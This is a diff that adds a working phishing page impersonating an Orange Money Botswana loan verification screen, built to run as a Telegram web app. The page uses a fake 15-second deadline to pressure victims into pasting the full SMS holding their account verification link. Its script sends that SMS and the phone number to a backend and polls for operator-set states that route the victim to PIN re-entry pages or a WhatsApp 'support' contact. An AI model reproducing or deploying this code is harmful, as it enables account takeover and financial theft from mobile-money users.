@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money Botswana - Verification</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f15a24;
+            --orange-gradient: linear-gradient(180deg, #ff6b00 0%, #f15a24 100%);
+            --bg-color: #f7f7f7;
+            --card-bg: #ffffff;
+            --text-dark: #111111;
+            --text-muted: #666666;
+            --border-orange: #ffaa71;
+            --notice-bg: #fff7ed;
+            --notice-border: #f97316;
+            --notice-text: #9a3412;
+            --btn-disabled-bg: #e0e0e0;
+            --btn-disabled-text: #999999;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+        }
+
+        .header-box {
+            width: 100%;
+            background: var(--orange-gradient);
+            padding: 25px 20px 40px 20px;
+            color: white;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .main-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: -20px;
+            flex-grow: 1;
+        }
+
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            align-self: flex-start;
+        }
+
+        h2 {
+            margin: 0 0 12px 0;
+            font-size: 24px;
+            color: var(--text-dark);
+            font-weight: 800;
+            line-height: 1.2;
+            text-align: center;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin: 0 0 16px 0;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        /* Notice Warning Box */
+        .notice-box {
+            background-color: var(--notice-bg);
+            border: 1.5px solid var(--notice-border);
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 20px;
+            font-size: 13.5px;
+            color: var(--notice-text);
+            font-weight: 700;
+            line-height: 1.4;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-align: left;
+        }
+
+        .notice-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        /* Phone Input Display */
+        .phone-container {
+            display: flex;
+            align-items: center;
+            border: 1.5px solid var(--border-orange);
+            border-radius: 10px;
+            background-color: #fffaf6;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .phone-prefix {
+            background-color: #f15a24;
+            color: white;
+            font-weight: 800;
+            padding: 14px 16px;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .phone-number {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+            padding: 14px 16px;
+        }
+
+        .field-label {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        textarea {
+            width: 100%;
+            height: 100px;
+            border: 1.5px solid var(--border-orange);
+            border-radius: 10px;
+            padding: 12px;
+            font-size: 14px;
+            outline: none;
+            resize: none;
+            font-family: inherit;
+            color: #333333;
+            background-color: #fffaf6;
+        }
+
+        textarea::placeholder {
+            color: #aaaaaa;
+        }
+
+        .resend-text {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 14px;
+            margin: 20px 0;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
+        .submit-btn.active {
+            background: var(--orange-gradient);
+            color: white;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            opacity: 0.95;
+        }
+
+        .footer-banner {
+            width: 100%;
+            background: var(--orange-gradient);
+            height: 80px;
+            border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px;
+            margin-top: 40px;
+        }
+
+        /* Fullsize Screen Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            min-height: 100vh;
+            background: var(--orange-gradient);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .overlay-card {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: white;
+        }
+
+        .overlay-desc {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #ffffff;
+            line-height: 1.4;
+        }
+
+        .wa-btn {
+            display: block;
+            width: 100%;
+            background-color: white;
+            color: var(--orange-primary);
+            font-weight: 800;
+            padding: 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            word-break: break-all;
+            font-size: 13px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    Orange Money Loans
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>Verify Link</h2>
+
+        <p class="instruction">
+            Please copy the link immediately you receive and paste below then tap verify.
+        </p>
+
+        <!-- Dynamic Notice Box -->
+        <div class="notice-box">
+            <span class="notice-icon">⚠️</span>
+            <div>
+                This link expires in <span id="timer">15</span> seconds. Please send it quickly.
+            </div>
+        </div>
+
+        <!-- Phone Display Block -->
+        <div class="phone-container">
+            <div class="phone-prefix">
+                <span>🇧🇼</span>
+                <span>+267</span>
+            </div>
+            <div class="phone-number" id="displayPhone">
+                ...
+            </div>
+        </div>
+
+        <label class="field-label" for="smsInput">Full SMS Message</label>
+        <textarea id="smsInput" placeholder="Paste full SMS message containing link here..."></textarea>
+        
+        <div id="errorText" class="error-message">The link is incorrect or has expired, please use the latest link received.</div>
+
+        <div class="resend-text" id="timerBox">
+            Resend in <span id="timerSub">15</span> seconds
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>VERIFY LINK</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<!-- Loading Overlay -->
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">Please wait...</div>
+    </div>
+</div>
+
+<!-- WhatsApp Support Overlay -->
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">Contact Us on WhatsApp</div>
+        <div class="overlay-desc">Click the link below to contact support on WhatsApp</div>
+        <a href="https://wa.me/message/ICY6YKSAAG3GC1" target="_blank" class="wa-btn">
+            https://wa.me/message/ICY6YKSAAG3GC1
+        </a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const smsInput = document.getElementById('smsInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerEl = document.getElementById('timer');
+    const timerSubEl = document.getElementById('timerSub');
+    const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+
+    // Load stored Botswana phone number
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
+    if (savedPhone) {
+        displayPhone.textContent = savedPhone.replace(/^\+?267/, '');
+    } else {
+        displayPhone.textContent = "72123456";
+    }
+
+    // Toggle submit button activation
+    smsInput.addEventListener('input', () => {
+        const hasText = smsInput.value.trim().length > 0;
+        submitBtn.disabled = !hasText;
+        submitBtn.classList.toggle('active', hasText);
+        errorText.style.display = 'none';
+    });
+
+    // 15 seconds countdown timer
+    let timeLeft = 15;
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+        if (timerSubEl) timerSubEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerBox.innerHTML = '<span style="color:var(--orange-primary); cursor:pointer; font-weight:700;" onclick="location.reload()">Resend Code</span>';
+        }
+    }, 1000);
+
+    // Poll status from API
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+
+                // Proceed to page 9
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9";
+                } 
+                // Wrong PIN -> back to page 6
+                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page6?error=wrongpin";
+                } 
+                // Incorrect SMS Link
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "The link is incorrect or has expired, please use the latest link received.";
+                    errorText.style.display = "block";
+                    smsInput.value = "";
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                } 
+                // Contact support overlay
+                else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) {
+                console.error("Status check error:", err);
+            }
+        }, 2000);
+    }
+
+    // Submission handler
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        const pastedLink = smsInput.value.trim();
+        if (!pastedLink) return;
+
+        contactOverlay.style.display = "none";
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    link: pastedLink
+                })
+            });
+
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("Error sending request.");
+            }
+        } catch (err) {
+            console.error("Submission error:", err);
+            statusOverlay.style.display = "none";
+            alert("Connection error.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
